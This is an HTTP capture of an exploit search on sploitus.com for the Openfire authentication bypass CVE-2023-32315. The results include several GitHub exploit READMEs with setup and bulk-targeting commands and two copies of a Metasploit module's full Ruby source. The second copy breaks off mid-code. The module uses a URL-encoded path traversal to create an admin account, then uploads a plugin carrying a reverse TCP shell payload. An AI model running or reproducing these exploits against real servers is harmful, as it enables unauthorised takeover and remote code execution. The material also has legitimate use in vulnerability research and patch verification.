Request: 
POST /search HTTP/2
Host: sploitus.com
Cookie: _gid=GA1.2.251421971.1702692995; _gat_gtag_UA_125861816_1=1; _ga_MEMT0D846W=GS1.1.1702692995.1.0.1702692995.60.0.0; _ga=GA1.1.1566257637.1702692995; _ym_uid=1702692995328423413; _ym_d=1702692995; cf_clearance=FD62whZbf945ql3GWfP3knr__fTLwO7gU3lHib8IVVI-1702692993-0-1-6c6ad37f.c2473279.3b6b8c9f-0.2.1702692993; _ym_isad=2
Content-Length: 86
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Accept: application/json
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Origin: https://sploitus.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://sploitus.com/?query=CVE-2023-32315
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

{"type":"exploits","sort":"default","query":"CVE-2023-32315","title":false,"offset":0}


Response:
HTTP/2 200 OK
Date: Sat, 16 Dec 2023 02:17:22 GMT
Content-Type: application/json
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer-when-downgrade
Content-Security-Policy: default-src 'self' https: 'unsafe-inline'
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Cf-Cache-Status: DYNAMIC
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=jL82GzlP30zYOMnA0MUdYLNKOdxy2M9gYCYdt79qC5Zc3q4X8d3wKE8K0sLCtw5%2FRw4BVjXf2xaOv2zknFKJWat6XFeaTI%2FctCWJMqVkbc4%2BR61vJaLq6%2FJS2CwzCvw%3D"}],"group":"cf-nel","max_age":604800}
Nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
Server: cloudflare
Cf-Ray: 83636df26d99045b-HKG
Alt-Svc: h3=":443"; ma=86400

{"exploits": [{"title": "Exploit for Path Traversal in Igniterealtime Openfire", "score": 5.0, "href": "https://github.com/miko550/CVE-2023-32315", "type": "githubexploit", "published": "2023-06-18", "id": "6485912E-5788-53F6-8307-75849FBF86E9", "source": "## https://sploitus.com/exploit?id=6485912E-5788-53F6-8307-75849FBF86E9\n# CVE-2023-32315\nOpenfire Console Authentication Bypass Vulnerability with RCE plugin\n\n## Setup\n```\ngit clone https://github.com/miko550/CVE-2023-32315.git\ncd CVE-2023-32315\npip3 install -r requirements.txt\n```\n## Usage\n```\npython3 CVE-2023-32315.py -t http://127.0.0.1:9090\npython3 CVE-2023-32315.py -l lists.txt\n```\n### Step\n1. Run exploit\n2. login with newly added user\n3. goto tab plugin > upload plugin `openfire-management-tool-plugin.jar`\n4. goto tab server > server settings > Management tool\n## Vulnerable Openfire Docker\n```\ndocker pull nasqueron/openfire:4.7.1\nsudo docker run --name openfire -d --restart=always --publish 9090:9090 --publish 5222:5222 --publish 7777:7777 --volume /srv/docker/openfire:/var/lib/openfire nasqueron/openfire:4.7.1\n```\n## Reference\n- https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass\n- https://github.com/5rGJ5aCh5oCq5YW9/CVE-2023-32315exp", "language": "MARKDOWN"}, {"title": "Exploit for Path Traversal in Igniterealtime Openfire", "score": 5.0, "href": "https://github.com/tangxiaofeng7/CVE-2023-32315-openfire-bypass", "type": "githubexploit", "published": "2023-06-14", "id": "7430153C-B4C2-5D19-841D-38CCCBC47DFE", "source": "## https://sploitus.com/exploit?id=7430153C-B4C2-5D19-841D-38CCCBC47DFE\n# CVE-2023-32315\n\n0x01 \u83b7\u53d6\u8fd4\u56de\u7684JSESSIONID\u548ccsrftoken ,\u6784\u9020\u8bf7\u6c42\u5305\u65b0\u589e\u7528\u6237(\u66ff\u6362JSESSIONID\u3001csrftoken)\n![img.png](img/img.png)\n```\ncd CVE-2023-32315-Openfire-Bypass/scan_all\ngo mod tidy\ngo run main.go -u http://openfire.com:9090\n```\n0x02 \u63d2\u4ef6\u7f16\u8bd1\u5b89\u88c5\n```\nmvn clean package\n```\n\u6216\nreleases\u4e0b\u8f7d\u63d2\u4ef6\n\n0x03 \u4e0a\u4f20\u63d2\u4ef6\n![img.png](img/plugin.png)\n\n0x04 \u5f97\u5230webshel\n![img.png](img/webshell.png)\n0x05 \u6267\u884c\u547d\u4ee4\n![img.png](img/cmd.png)", "language": "MARKDOWN"}, {"title": "Exploit for Path Traversal in Igniterealtime Openfire", "score": 5.0, "href": "https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT", "type": "githubexploit", "published": "2023-12-15", "id": "2063BA44-2ECB-5043-A0F0-702F408CC56D", "source": "## https://sploitus.com/exploit?id=2063BA44-2ECB-5043-A0F0-702F408CC56D\n# CVE-2023-32315 - Openfire Authentication Bypass\n\nThis repository highlights a high security issue impacting various versions of Openfire. Openfire, a cross-platform real-time collaboration server utilizing the XMPP protocol developed by the Ignite Realtime community, faces a severe vulnerability within its administrative console (Admin Console).\n\nThe vulnerability lies within the web-based Admin Console, permitting a path traversal attack through the setup environment. This flaw allows unauthenticated users to access restricted pages intended only for administrative users within an already configured Openfire environment.\n\nWhile Openfire had path traversal protections, it failed to defend against certain non-standard URL encoding for UTF-16 characters, not supported by the embedded webserver in use at that time. The subsequent upgrade of the embedded webserver introduced support for this non-standard encoding, which the existing path traversal protections did not cover.\n\nMoreover, Openfire's API allowed exclusion of certain URLs from web authentication using wildcard patterns, such as the login page. This combination of wildcard pattern matching and the path traversal vulnerability enabled malicious users to bypass authentication requirements for Admin Console pages.\n\nThis vulnerability impacts all Openfire versions released after April 2015, commencing from version 3.10.0. The issue has been patched in releases 4.7.5 and 4.6.8. Further enhancements are slated for the forthcoming version on the 4.8 branch (expected as version 4.8.0).\n\n# The PoC Exploit\n![ALT Text](Screenshot_2023-12-15_09-09-47.png)\n![ALT Text](Screenshot_2023-12-15_09-12-41.png)\n![ALT Text](Screenshot_2023-12-15_09-15-05.png)\n![ALT Text](Screenshot_2023-12-15_09-46-59.png)\n\n# Disclaimer\n\nYou are responsible for your own actions, abusing this poc exploit can get you into trouble.", "language": "MARKDOWN"}, {"title": "Exploit for Path Traversal in Igniterealtime Openfire", "score": 5.0, "href": "https://github.com/gibran-abdillah/CVE-2023-32315", "type": "githubexploit", "published": "2023-08-31", "id": "35FAD97A-5330-5A1B-93B1-9526E967A3A9", "source": "## https://sploitus.com/exploit?id=35FAD97A-5330-5A1B-93B1-9526E967A3A9\n# CVE-2023-32315\nTool for CVE-2023-32315 exploitation.\n\n## Features:\n- Scans single or bulk targets from txt files\n- Utilizes multiprocessing for faster scanning\n- Automatic login capability\n\n## Installation:\n- Make sure you're in this repo's directory and have python3 installed\n- Install required packages using:\n  ```sh\n  pip install -r requirements.txt\n  ```\n- Run the tool with the following command:\n  ```sh\n  python3 CVE-2023-32315.py\n  ```\n\n## Usage \n- For bulk targets \n  ```sh \n  python3 CVE-2023-32315.py --web-list sites.txt -p 10\n  ```\n- For single target \n  ```sh \n  python3 CVE-2023-32315.py -u http://127.0.0.1:9090\n  ```\n\n## Screenshots \n![Screenshot 2023-08-31 153909](https://github.com/gibran-abdillah/quiz-app/assets/70421698/7a9ea21d-b5ac-435b-abdf-4815eeb458f5)\n![Screenshot 2023-08-31 154022](https://github.com/gibran-abdillah/quiz-app/assets/70421698/e98f9d02-b02a-4260-8395-f157c66529a2)\n\n\n## References \n- https://codewithvamp.medium.com/cve-2023-32315-administration-console-authentication-bypass-c1429f8c4576\n- https://github.com/miko550/CVE-2023-32315", "language": "MARKDOWN"}, {"title": "Exploit for Path Traversal in Igniterealtime Openfire", "score": 5.0, "href": "https://github.com/whutw00t/CVE-2023-32315", "type": "githubexploit", "published": "2023-07-02", "id": "51E53E8A-4729-5E79-AA12-A030695631C1", "source": "## https://sploitus.com/exploit?id=51E53E8A-4729-5E79-AA12-A030695631C1\n## CVE-2023-32315\n- Openfire's administrative console (the Admin Console), a web-based application, was found to be vulnerable to a path traversal attack via the setup environment.\nThis permitted an unauthenticated user to use the unauthenticated Openfire Setup Environmentin an already configured\nOpenfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users and it can lead to RCE\n## Screenshot\n![Screenshot_6](https://github.com/Pari-Malam/CVE-2023-32315/assets/25004320/0c1e4fbd-eade-4d6f-a3ba-13f12ed426eb)\n![Screenshot_7](https://github.com/Pari-Malam/CVE-2023-32315/assets/25004320/7b9be32b-3f1b-4d19-a121-f5753db21db2)\n## Requirements\n- Python3.7+\n## Supported Os\n- Linuxer\n- Wingays\n## Get start with\n```\n$ git clone https://github.com/Pari-Malam/CVE-2023-32315\n$ cd CVE-2023-32315\n$ pip/pip3 install -r requirements.txt\n$ python/python3 CVE-2023-32315.py\n```\n## Footprints Notes\n- By using this tool, you agree that you are using it for educational purposes only and that you will not use it for any illegal activity. You also agree to bear all risks associated with the use of this tool. I will not be responsible for direct or indirect damage caused by the use of this tool. Don't suyyyyyyyyyyyyyyyyyyyy me!\n## Author\n- Pari Malam\n## Contacts\n[![Telegram](https://img.shields.io/badge/-Telegram-blue)](https://telegram.me/SurpriseMTFK)\n[![Discord](https://img.shields.io/badge/-Discord-purple)](https://discordapp.com/users/829404192585678858)", "language": "MARKDOWN"}, {"title": "Exploit for Path Traversal in Igniterealtime Openfire", "score": 5.0, "href": "https://github.com/Pari-Malam/CVE-2023-32315", "type": "githubexploit", "published": "2023-07-02", "id": "D445FA2D-7375-5373-B405-EBADCF5E2312", "source": "## https://sploitus.com/exploit?id=D445FA2D-7375-5373-B405-EBADCF5E2312\n## CVE-2023-32315\n- Openfire's administrative console (the Admin Console), a web-based application, was found to be vulnerable to a path traversal attack via the setup environment.\nThis permitted an unauthenticated user to use the unauthenticated Openfire Setup Environmentin an already configured\nOpenfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users and it can lead to RCE\n## Screenshot\n![Screenshot_6](https://github.com/Pari-Malam/CVE-2023-32315/assets/25004320/0c1e4fbd-eade-4d6f-a3ba-13f12ed426eb)\n![Screenshot_7](https://github.com/Pari-Malam/CVE-2023-32315/assets/25004320/7b9be32b-3f1b-4d19-a121-f5753db21db2)\n## Requirements\n- Python3.7+\n## Supported Os\n- Linuxer\n- Wingays\n## Get start with\n```\n$ git clone https://github.com/Pari-Malam/CVE-2023-32315\n$ cd CVE-2023-32315\n$ pip/pip3 install -r requirements.txt\n$ python/python3 CVE-2023-32315.py\n```\n## Footprints Notes\n- By using this tool, you agree that you are using it for educational purposes only and that you will not use it for any illegal activity. You also agree to bear all risks associated with the use of this tool. I will not be responsible for direct or indirect damage caused by the use of this tool. Don't suyyyyyyyyyyyyyyyyyyyy me!\n## Author\n- Pari Malam\n## Contacts\n[![Telegram](https://img.shields.io/badge/-Telegram-blue)](https://telegram.me/SurpriseMTFK)\n[![Discord](https://img.shields.io/badge/-Discord-purple)](https://discordapp.com/users/829404192585678858)", "language": "MARKDOWN"}, {"title": "Exploit for Path Traversal in Igniterealtime Openfire", "score": 5.0, "href": "https://github.com/izzz0/CVE-2023-32315-POC", "type": "githubexploit", "published": "2023-07-07", "id": "1407A3A4-955E-5864-848B-0A91AC9A29DF", "source": "## https://sploitus.com/exploit?id=1407A3A4-955E-5864-848B-0A91AC9A29DF\n# CVE-2023-32315-POC\nCVE-2023-32315-Openfire-Bypass-Py\n\n## \u6982\u8ff0\n\u8fd9\u4e2a\u4ee3\u7801\u662fCVE-2023-32315 Python\u7248\u672c\u7684POC\uff0c\u7528\u4e8e\u6267\u884c\u4e00\u7cfb\u5217\u64cd\u4f5c\u6765\u9a8c\u8bc1\u76ee\u6807\u7f51\u7ad9\u662f\u5426\u53d7 CVE-2023-32315 \u6f0f\u6d1e\u7684\u5f71\u54cd\uff0c\u5e76\u5c1d\u8bd5\u5728\u53d7\u5f71\u54cd\u7684\u7f51\u7ad9\u4e0a\u6267\u884c\u4e00\u4e9b\u64cd\u4f5c\u3002  \n\u7ecf\u8fc7\u9a8c\u8bc1\uff0ccookie\u7684csrf\u548cjsessionid\u5e76\u975e\u5fc5\u8981\uff0c\u53ea\u8981\u6709\u800c\u4e14\u683c\u5f0f\u6b63\u786e\u5c31\u884c\uff0c4.0.x\u5de6\u53f3\u7684\u4f4e\u7248\u672c\u6ca1\u7528csrf\n\u672c\u6587\u4e0d\u63d0\u4f9bwebshell\uff0c\u9700\u8981\u81ea\u884c\u524d\u5f80https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/tag/v0.1\u5904\u4e0b\u8f7d  \n\n## \u529f\u80fd\n1\u3001\u68c0\u67e5\u76ee\u6807\u7f51\u7ad9\u7684\u7248\u672c\u53f7\uff0c\u5e76\u786e\u5b9a\u662f\u5426\u5728 CVE-2023-32315 \u6f0f\u6d1e\u7684\u5f71\u54cd\u8303\u56f4\u5185\u3002  \n2\u3001\u83b7\u53d6\u76ee\u6807\u7f51\u7ad9\u7684 JSESSIONID \u548c CSRF \u4ee4\u724c\u3002  \n3\u3001\u5728\u76ee\u6807\u7f51\u7ad9\u4e0a\u6dfb\u52a0\u4e00\u4e2a\u968f\u673a\u751f\u6210\u7684\u7528\u6237\u3002  \n\n## \u4f7f\u7528\u65b9\u6cd5\n1\u3001\u786e\u4fdd\u5df2\u5b89\u88c5\u6240\u9700\u7684 Python \u7248\u672c\u3002  \n2\u3001\u5b89\u88c5\u4f9d\u8d56\u5e93\uff1apip install -r requirements.txt\u3002  \n3\u3001\u6267\u884c\u547d\u4ee4\uff1apython script.py -u <\u76ee\u6807URL> \u6765\u9a8c\u8bc1\u5355\u4e2a\u76ee\u6807\u7f51\u7ad9\u3002  \n4\u3001\u6267\u884c\u547d\u4ee4\uff1apython script.py -l <URL\u6587\u4ef6\u8def\u5f84> \u6765\u9a8c\u8bc1\u591a\u4e2a\u76ee\u6807\u7f51\u7ad9\u3002 \n5\u3001\u53ef\u4ee5\u901a\u8fc7 -t <\u7ebf\u7a0b\u6570> \u53c2\u6570\u6765\u6307\u5b9a\u7ebf\u7a0b\u6570\uff0c\u9ed8\u8ba4\u4e3a 10\u3002  \n6\u3001\u7ed3\u679c\u5c06\u6253\u5370\u5728\u7ec8\u7aef\u4e0a\uff0c\u5e76\u5c06\u8be6\u7ec6\u7ed3\u679c\u5199\u5165 vuln.txt \u6587\u4ef6\u4e2d\u3002  \n\n## \u6ce8\u610f\u4e8b\u9879\n\u8bf7\u786e\u4fdd\u76ee\u6807\u7f51\u7ad9\u7684\u53ef\u8bbf\u95ee\u6027\u548c\u6b63\u786e\u6027\u3002  \n\u4ec5\u5728\u5408\u6cd5\u6388\u6743\u4e0b\u4f7f\u7528\u6b64\u4ee3\u7801\u3002  \n\u4f5c\u8005\u5bf9\u4ee3\u7801\u7684\u4f7f\u7528\u548c\u4ea7\u751f\u7684\u540e\u679c\u4e0d\u627f\u62c5\u4efb\u4f55\u8d23\u4efb\u3002", "language": "MARKDOWN"}, {"title": "Openfire Authentication Bypass / Remote Code Execution", "score": 5.0, "href": "https://packetstormsecurity.com/files/download/173607/openfire_auth_bypass_rce_cve_2023_32315.rb.txt", "type": "packetstorm", "published": "2023-07-19", "id": "PACKETSTORM:173607", "source": "## https://sploitus.com/exploit?id=PACKETSTORM:173607\n##  \n# This module requires Metasploit: https://metasploit.com/download  \n# Current source: https://github.com/rapid7/metasploit-framework  \n##  \n  \nrequire 'rex/zip'  \n  \nclass MetasploitModule < Msf::Exploit::Remote  \nRank = ExcellentRanking  \n  \ninclude Msf::Exploit::Remote::HttpClient  \nprepend Msf::Exploit::Remote::AutoCheck  \n  \ndef initialize(info = {})  \nsuper(  \nupdate_info(  \ninfo,  \n'Name' => 'Openfire authentication bypass with RCE plugin',  \n'Description' => %q{  \nOpenfire is an XMPP server licensed under the Open Source Apache License.  \nOpenfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack  \nvia the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment  \nin an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for  \nadministrative users.  \nThis module will use the vulnerability to create a new admin user that will be used to upload a Openfire management plugin  \nweaponised with java native payload that triggers an RCE.  \nThis vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0.  \nThe problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the  \nfirst version on the 4.8 branch, which is version 4.8.0.  \n},  \n'Author' => [  \n'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Metasploit module  \n],  \n'References' => [  \n['CVE', '2023-32315'],  \n['URL', 'https://attackerkb.com/topics/7Tf5YGY3oT/cve-2023-32315'],  \n['URL', 'https://github.com/miko550/CVE-2023-32315'],  \n['URL', 'https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm']  \n],  \n'License' => MSF_LICENSE,  \n'Platform' => [ 'java' ],  \n'Privileged' => false,  \n'Arch' => [ ARCH_JAVA ],  \n'Targets' => [  \n[  \n'Java Universal',  \n{  \n'Platform' => 'java',  \n'Arch' => ARCH_JAVA,  \n'DefaultOptions' => {  \n'PAYLOAD' => 'java/shell/reverse_tcp'  \n}  \n}  \n]  \n],  \n'DefaultTarget' => 0,  \n'DisclosureDate' => '2023-05-26',  \n'DefaultOptions' => {  \n'SSL' => false,  \n'RPORT' => 9090  \n},  \n'Notes' => {  \n'Stability' => [CRASH_SAFE],  \n'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],  \n'Reliability' => [REPEATABLE_SESSION]  \n}  \n)  \n)  \nregister_options(  \n[  \nOptString.new('TARGETURI', [true, 'The base path to the web application', '/']),  \nOptString.new('PLUGINNAME', [ false, 'Openfire plugin base name, (default: random)' ]),  \nOptString.new('PLUGINAUTHOR', [ false, 'Openfire plugin author, (default: random)' ]),  \nOptString.new('PLUGINDESC', [ false, 'Openfire plugin description, (default: random)' ]),  \nOptString.new('ADMINNAME', [ false, 'Openfire admin user name, (default: random)' ]),  \n]  \n)  \nend  \n  \ndef get_version  \n# get Openfire version number from the admin console login page  \nopenfire_version = nil  \nres = send_request_cgi({  \n'method' => 'GET',  \n'uri' => normalize_uri(target_uri.path, 'login.jsp'),  \n'ctype' => 'application/x-www-form-urlencoded'  \n})  \nif res && res.code == 200  \nversion = res.body.match(/Openfire,\\s*\\D*:\\s*\\d\\.\\d{1,2}\\.\\d/)  \nopenfire_version = Rex::Version.new(version[0].split(':')[1].strip) unless version.nil?  \nend  \n  \nopenfire_version  \nend  \n  \ndef auth_bypass  \n# bypass authentication using path traversal vulnerability and return true if cookie_jar is filled (JSESSION-ID and CSRF) else return false.  \nsend_request_cgi({  \n'method' => 'GET',  \n'uri' => normalize_uri(target_uri.path, 'setup', 'setup-s', '%u002e%u002e/%u002e%u002e/user-groups.jsp'),  \n'ctype' => 'application/x-www-form-urlencoded',  \n'keep_cookies' => true  \n})  \nreturn false if cookie_jar.cookies.empty?  \n  \ncookie_jar.cookies.each do |cookie|  \nprint_status(cookie.to_s)  \nend  \nreturn true  \nend  \n  \ndef add_admin_user  \n# add an admin user using path traversal vulnerability using the cookies retrieved from authentication bypass.  \n# returns admin login hash with random generated username and password  \n@admin_login = {}  \nusername = datastore['ADMINNAME'] || Rex::Text.rand_text_alpha_lower(8..15)  \npassword = Rex::Text.rand_password(8..10)  \ncookie_jar.cookies.each do |cookie|  \n@csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?  \nend  \n  \nres = send_request_cgi({  \n'method' => 'GET',  \n'uri' => normalize_uri(target_uri.path, 'setup', 'setup-s', '%u002e%u002e/%u002e%u002e/user-create.jsp'),  \n'ctype' => 'application/x-www-form-urlencoded',  \n'keep_cookies' => true,  \n'vars_get' => {  \n'csrf' => @csrf_token.to_s,  \n'username' => username.to_s,  \n'password' => password.to_s,  \n'passwordConfirm' => password.to_s,  \n'isadmin' => 'on',  \n'create' => 'Create+User'  \n}  \n})  \n# path traversal throws a java exception error 500 and/or returns a 200 OK code not matter if the user is added or not,  \n# so we have to check during the login of the new admin user if we have been successful here  \nif res && res.code == 200 || res.code == 500  \n@admin_login['username'] = username  \n@admin_login['password'] = password  \nend  \nreturn @admin_login  \nend  \n  \ndef login_admin_user  \n# login using admin hash with admin username and password  \n# returns true if login successful else returns false  \ncookie_jar.cookies.each do |cookie|  \n@csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?  \nend  \n  \nres = send_request_cgi!({  \n'method' => 'POST',  \n'uri' => normalize_uri(target_uri.path, 'login.jsp'),  \n'ctype' => 'application/x-www-form-urlencoded',  \n'keep_cookies' => true,  \n'vars_post' => {  \n'url' => '%2Findex.jsp',  \n'login' => 'true',  \n'csrf' => @csrf_token.to_s,  \n'username' => @admin_login['username'].to_s,  \n'password' => @admin_login['password'].to_s  \n}  \n})  \nif res && res.code == 200 && res.body.match(/login box/).nil?  \nstore_valid_credential(user: @admin_login['username'], private: @admin_login['password'], proof: cookie_jar.cookies)  \nreturn true  \nelse  \nreturn false  \nend  \nend  \n  \ndef prepare_plugin_jar  \n# prepares the plugin foundation that will host the payload  \nfiles = [  \n[ 'logo_large.gif' ],  \n[ 'logo_small.gif' ],  \n[ 'readme.html' ],  \n[ 'changelog.html' ],  \n[ 'lib', 'plugin-metasploit.jar' ]  \n]  \n  \njar = Rex::Zip::Jar.new  \njar.add_files(files, File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin'))  \n  \n@plugin_name = datastore['PLUGINNAME'] || Rex::Text.rand_text_alphanumeric(8..15)  \nplugin_author = datastore['PLUGINAUTHOR'] || Rex::Text.rand_text_alphanumeric(8..15)  \nplugin_desc = datastore['PLUGINDESC'] || Rex::Text.rand_text_alphanumeric(8..15)  \n  \nplugin_xml = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin', 'plugin.xml'))  \nplugin_xml.gsub!(/PLUGINNAME/, @plugin_name)  \nplugin_xml.gsub!(/PLUGINDESCRIPTION/, plugin_desc)  \nplugin_xml.gsub!(/PLUGINAUTHOR/, plugin_author)  \n  \njar.add_file('plugin.xml', plugin_xml)  \nreturn jar  \nend  \n  \ndef upload_and_execute_plugin(plugin_jar)  \n# upload and execute Openfire plugin with encoded payload  \n# returns true if upload is successful else returns false  \n  \n# construct multipart form data  \nform_data = Rex::MIME::Message.new  \nform_data.add_part(plugin_jar.to_s, 'application/x-java-archive', 'binary', \"form-data; name=\\\"uploadfile\\\"; filename=\\\"#{@plugin_name}.jar\\\"\")  \n  \n# extract the csrf token  \ncookie_jar.cookies.each do |cookie|  \n@csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?  \nend  \n  \nres = send_request_cgi({  \n'method' => 'POST',  \n'uri' => normalize_uri(target_uri.path, 'plugin-admin.jsp'),  \n'ctype' => \"multipart/form-data; boundary=#{form_data.bound}\",  \n'keep_cookies' => true,  \n'data' => form_data.to_s,  \n'vars_get' => {  \n'uploadplugin' => nil,  \n'csrf' => @csrf_token.to_s  \n}  \n})  \n# with a successfull upload and execution of the plugin, no response is returned.  \nreturn true unless res  \n# safety check if, for whatever reason, we get a 302 response back  \nif res.code == 302 && res.headers.to_s.match(/uploadsuccess=true/)  \nreturn true  \nelse  \nreturn false  \nend  \nend  \n  \ndef check  \nopenfire_version = get_version  \nreturn CheckCode::Safe if openfire_version.nil?  \n# check first for patched versions  \nreturn CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.6.8')  \nreturn CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.7.5')  \nreturn CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.8.0')  \n  \nif openfire_version < Rex::Version.new('4.8.0') && openfire_version >= Rex::Version.new('3.10.0')  \nCheckCode::Appears(\"Openfire version is #{openfire_version}\")  \nelse  \nCheckCode::Safe(\"Openfire version is #{openfire_version}\")  \nend  \nend  \n  \ndef exploit  \n# gain access exploiting path traversal vulnerability  \nprint_status('Grabbing the cookies.')  \nfail_with(Failure::NoAccess, 'Authentication bypass is not successful.') unless auth_bypass  \n  \n# add a new admin user  \nprint_status('Adding a new admin user.')  \nfail_with(Failure::NoAccess, 'Adding a new admin user is not successful.') if add_admin_user.empty?  \n  \n# login with new admin account  \nprint_status(\"Logging in with admin user \\\"#{@admin_login['username']}\\\" and password \\\"#{@admin_login['password']}\\\".\")  \nfail_with(Failure::NoAccess, 'Login is not successful.') unless login_admin_user  \n  \n# prepare Openfire plugin with payload  \nplugin = prepare_plugin_jar  \nplugin.add_file(\"lib/#{rand_text_alphanumeric(8)}.jar\", payload.encoded_jar.pack)  \nplugin.build_manifest  \n  \n# upload and execute Openfire plugin with payload  \nprint_status(\"Upload and execute plugin \\\"#{@plugin_name}\\\" with payload \\\"#{datastore['PAYLOAD']}\\\".\")  \nfail_with(Failure::PayloadFailed, 'Upload and/or execution of the plugin is not successful.') unless upload_and_execute_plugin(plugin.pack)  \n  \n# cover our tracks!!!  \n# remove plugin and newly added admin user  \n# Automatic removal of plugin and admin user might cause instability in the application,  \n# so remove it manually in Openfire Management console after the exploit is completed.  \nprint_warning(\"Plugin \\\"#{@plugin_name}\\\" need manually clean-up via Openfire Admin console.\")  \nprint_warning(\"Admin user \\\"#{@admin_login['username']}\\\" need manually clean-up via Openfire Admin console.\")  \nend  \nend", "language": "bash"}, {"title": "Openfire Authentication Bypass / Remote Code Execution Exploit", "score": 5.0, "href": "https://0day.today/exploit/38889", "type": "zdt", "published": "2023-07-19", "id": "1337DAY-ID-38889", "source": "## https://sploitus.com/exploit?id=1337DAY-ID-38889\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Openfire authentication bypass with RCE plugin',\n        'Description' => %q{\n          Openfire is an XMPP server licensed under the Open Source Apache License.\n          Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack\n          via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment\n          in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for\n          administrative users.\n          This module will use the vulnerability to create a new admin user that will be used to upload a Openfire management plugin\n          weaponised with java native payload that triggers an RCE.\n          This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0.\n          The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the\n          first version on the 4.8 branch, which is version 4.8.0.\n        },\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2023-32315'],\n          ['URL', 'https://attackerkb.com/topics/7Tf5YGY3oT/cve-2023-32315'],\n          ['URL', 'https://github.com/miko550/CVE-2023-32315'],\n          ['URL', 'https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => [ 'java' ],\n        'Privileged' => false,\n        'Arch' => [ ARCH_JAVA ],\n        'Targets' => [\n          [\n            'Java Universal',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'java/shell/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-05-26',\n        'DefaultOptions' => {\n          'SSL' => false,\n          'RPORT' => 9090\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),\n        OptString.new('PLUGINNAME', [ false, 'Openfire plugin base name, (default: random)' ]),\n        OptString.new('PLUGINAUTHOR', [ false, 'Openfire plugin author, (default: random)' ]),\n        OptString.new('PLUGINDESC', [ false, 'Openfire plugin description, (default: random)' ]),\n        OptString.new('ADMINNAME', [ false, 'Openfire admin user name, (default: random)' ]),\n      ]\n    )\n  end\n\n  def get_version\n    # get Openfire version number from the admin console login page\n    openfire_version = nil\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'login.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded'\n    })\n    if res && res.code == 200\n      version = res.body.match(/Openfire,\\s*\\D*:\\s*\\d\\.\\d{1,2}\\.\\d/)\n      openfire_version = Rex::Version.new(version[0].split(':')[1].strip) unless version.nil?\n    end\n\n    openfire_version\n  end\n\n  def auth_bypass\n    # bypass authentication using path traversal vulnerability and return true if cookie_jar is filled (JSESSION-ID and CSRF) else return false.\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'setup', 'setup-s', '%u002e%u002e/%u002e%u002e/user-groups.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'keep_cookies' => true\n    })\n    return false if cookie_jar.cookies.empty?\n\n    cookie_jar.cookies.each do |cookie|\n      print_status(cookie.to_s)\n    end\n    return true\n  end\n\n  def add_admin_user\n    # add an admin user using path traversal vulnerability using the cookies retrieved from authentication bypass.\n    # returns admin login hash with random generated username and password\n    @admin_login = {}\n    username = 